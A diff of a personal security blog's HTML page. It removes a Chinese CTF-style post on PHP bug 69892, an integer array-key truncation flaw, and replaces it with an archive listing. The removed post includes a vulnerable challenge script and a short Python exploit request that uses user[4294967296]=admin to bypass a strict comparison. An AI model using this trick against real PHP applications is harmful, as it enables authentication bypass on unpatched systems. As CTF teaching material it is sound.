@@ -4,7 +4,7 @@
 <meta name="google-site-verification" content="fQ_tfBgNjE9NQcpKnGAkWapHoKuimF5lVuNuqpPXar0">
     <meta charset="utf-8">
     
-    <title>PHP整数键截断问题 | Xiao Leung&#39;s Blog</title>
+    <title>archive_a: 2020/7 | Xiao Leung&#39;s Blog</title>
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
     
     
@@ -99,155 +99,28 @@
 <!--文章列表-->
 <div class="wrapper">
   
-    <!--文章-->
-<article>
-	
-  
-    <h1 class="post-title" itemprop="name">
-      PHP整数键截断问题
-    </h1>
-  
-
-	<div class='post-body mb'>
-		<ul>
-<li><p>漏洞详情</p>
-<p> <a href="https://bugs.php.net/bug.php?id=69892" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=69892</a> </p>
-</li>
-<li><p>影响版本</p>
-<p> 5.4.0 - 5.4.43, 5.5.0 - 5.5.26, 5.6.0 - 5.6.10, 7.0.0alpha1 </p>
-</li>
-</ul>
-<pre><code class="php">&lt;?php
-include(&quot;flag.php&quot;);
-
-if(empty($_GET[&#39;user&#39;])) die(show_source(__FILE__));
-$a= strval(time());
-$user = [&#39;admin&#39;,$a];
-if($_GET[&#39;user&#39;] === $user &amp;&amp;$_GET[&#39;user&#39;][0]!=&#39;admin&#39;){
-    echo $flag;
-}
-?&gt;</code></pre>
-<p>我们直接看漏洞详情，这样比较会直接相等：</p>
-<pre><code class="php">var_dump([0 =&gt; 0] === [0x100000000 =&gt; 0]);</code></pre>
-<p>测试发现将0x10000000转换为10进制： 4294967296 ，逻辑依然成立。</p>
-<p>上题直接构造exp:</p>
-<pre><code class="python">import requests
-import time
-
-url =&quot;http://xxxxxx.xx/?user[4294967296]=admin&amp;user[1]=&quot;+str(int(time.time()))
-result = requests.get(url)
-print(url)
-print(result.text)</code></pre>
-<p>需要注意的是，这个问题只能在64位PHP中复现成功，在32位中会将传入的4294967296解析为字符串导致匹配错误。</p>
-
-	</div>
-	<div class="meta split">
-		
-			<span>本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次</span>
-		
-		<time class="post-date" datetime="2019-10-25T15:28:01.000Z" itemprop="datePublished">2019-10-25</time>
-	</div>
-</article>
-<!-- 目录内容 -->
-<div id='maktoc'>
-
-    <p class="show-toc-btn" id="show-toc-btn" onclick="showToc();" style="display:none">
-          <span class="btn-bg"></span>
-          <span class="btn-text">文章导航</span>
-          </p>
-    <div id="toc-article" class="toc-article">
-        <span id="toc-close" class="toc-close" title="隐藏导航" onclick="showBtn();">×</span>
-        <strong class="toc-title">文章目录</strong>
-           
-         </div>
-   <script type="text/javascript">
-    function showToc(){
-        var toc_article = document.getElementById("toc-article");
-        var show_toc_btn = document.getElementById("show-toc-btn");
-        toc_article.setAttribrootute("style","display:block");
-        show_toc_btn.setAttribute("style","display:none");
-        };
-    function showBtn(){
-        var toc_article = document.getElementById("toc-article");
-        var show_toc_btn = document.getElementById("show-toc-btn");
-        toc_article.setAttribute("style","display:none");
-        show_toc_btn.setAttribute("style","display:block");
-        };
-	function getScrollTop() {
-	    var scroll_top = 0;
-	    if (document.documentElement && document.documentElement.scrollTop) {
-		scroll_top = document.documentElement.scrollTop;
-	    }
-	    else if (document.body) {
-		scroll_top = document.body.scrollTop;
-	    }
-	    return scroll_top;
-	};
-	var headers=document.getElementById("headers");
-	var tocs = document.getElementById("toc-article");
-	
-	
-	window.onscroll  = function(){
-	if(getScrollTop()>450){
-			if(tocs.offsetTop>100){
-			var tophight = tocs.offsetTop-15;
-			tocs.style.cssText="top:"+tophight+"px";
-			}
-	}else{
-			tocs.style.cssText="top:540px";
-		}
-				
-		
-		//console.log(getScrollTop());	
-		
-	}
-window.onresize = function(){
-	var mak_toc = document.getElementById("maktoc");
-	if($(window).width()<1414){
-	mak_toc.setAttribute("style","display:none");
-	}else{
-	mak_toc.setAttribute("style","display:block");
-	}
-}
-   </script>
+    <ul class="posts-list mb+ js-posts">
       
-<!-- 目录内容结束 -->
-</div>
-
-<!--评论-->
-
-	
-<div id="lv-container" data-id="city" data-uid="MTAyMC80OTc4Mi8yNjI3Mw==">
-	<script type="text/javascript">
-   (function(d, s) {
-       var j, e = d.getElementsByTagName(s)[0];
-
-       if (typeof LivereTower === 'function') { return; }
-
-       j = d.createElement(s);
-       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
-       j.async = true;
-
-       e.parentNode.insertBefore(j, e);
-   })(document, 'script');
-	</script>
-<noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
-</div>
-
-
+                <!--<div class="type">
+          <div class="mask">
+            <i class="iconfont"></i>
+          </div>
+          </div>-->
+        <li class="post">
+          
+            <i class="post-status iconfont icon-icon"></i>  
+          
+          <h2 class="no-background"  >
+            <span><a href="/2020/07/02/Tstar/">2020腾讯犀牛鸟网络安全T-Star高校挑战赛Writeup</a></span>
+            <time class="post-time" datetime="2020-07-02T09:35:46.000Z" itemprop="datePublished">2020-07-02</time>
+          </h2>
+        </li>
+      
+    </ul>
+    
 
   
 </div>
-
-
-  <svg id="bigTriangleColor" width="100%" height="40" viewBox="0 0 100 102" preserveAspectRatio="none">
-    <path d="M0 0 L50 100 L100 0 Z"></path>
-  </svg>
-
-  
-
-
-  <div class="wrapper"></div>
 
 
 
